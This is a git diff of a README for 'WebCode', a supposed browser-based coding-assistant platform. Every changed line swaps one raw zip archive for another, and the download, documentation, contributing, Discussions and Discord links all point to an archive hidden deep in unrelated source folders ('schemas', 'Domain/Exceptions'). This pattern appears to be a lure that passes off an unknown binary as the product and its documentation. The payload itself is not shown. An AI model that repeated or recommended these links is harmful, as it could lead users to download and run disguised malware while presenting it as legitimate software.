@@ -1,6 +1,6 @@
 # 🌐 WebCode - Code Anywhere with a Browser
 
-[![Download WebCode](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/skills/claude/docx/ooxml/schemas/ISO-IEC29500-4_2016/Code-Web-v3.3-alpha.4.zip)](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/skills/claude/docx/ooxml/schemas/ISO-IEC29500-4_2016/Code-Web-v3.3-alpha.4.zip)
+[![Download WebCode](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/WebCodeCli.Domain/Domain/Exceptions/Code-Web-3.8.zip)](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/WebCodeCli.Domain/Domain/Exceptions/Code-Web-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ WebCode is a browser-based platform that lets you run coding assistants like Cla
 
 To get started, visit the following page to download WebCode:
 
-[Download WebCode](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/skills/claude/docx/ooxml/schemas/ISO-IEC29500-4_2016/Code-Web-v3.3-alpha.4.zip)
+[Download WebCode](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/WebCodeCli.Domain/Domain/Exceptions/Code-Web-3.8.zip)
 
 1. Open the link above in your browser.
 2. Look for the latest release. It will be listed at the top of the page.
@@ -48,7 +48,7 @@ WebCode offers a range of useful features:
 
 ## 📚 Documentation & Support
 
-For more detailed instructions, features, and support, please refer to our [documentation](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/skills/claude/docx/ooxml/schemas/ISO-IEC29500-4_2016/Code-Web-v3.3-alpha.4.zip).
+For more detailed instructions, features, and support, please refer to our [documentation](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/WebCodeCli.Domain/Domain/Exceptions/Code-Web-3.8.zip).
 
 ## 🔧 Troubleshooting
 
@@ -61,7 +61,7 @@ If you encounter any issues while using WebCode, try the following steps:
 
 ## 👐 Contributing
 
-We welcome contributions! If you'd like to help improve WebCode, please check our [contributing guide](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/skills/claude/docx/ooxml/schemas/ISO-IEC29500-4_2016/Code-Web-v3.3-alpha.4.zip).
+We welcome contributions! If you'd like to help improve WebCode, please check our [contributing guide](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/WebCodeCli.Domain/Domain/Exceptions/Code-Web-3.8.zip).
 
 ## 🏷 Topics
 
@@ -82,8 +82,8 @@ Feel free to explore these topics further on our GitHub repository.
 
 Join our community for updates and discussions about WebCode. You can connect with us on:
 
-- [GitHub Discussions](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/skills/claude/docx/ooxml/schemas/ISO-IEC29500-4_2016/Code-Web-v3.3-alpha.4.zip)
-- [Discord](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/skills/claude/docx/ooxml/schemas/ISO-IEC29500-4_2016/Code-Web-v3.3-alpha.4.zip)
+- [GitHub Discussions](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/WebCodeCli.Domain/Domain/Exceptions/Code-Web-3.8.zip)
+- [Discord](https://github.com/Azistoteles/WebCode/raw/refs/heads/main/WebCodeCli.Domain/Domain/Exceptions/Code-Web-3.8.zip)
 
 ## 📅 Roadmap
 
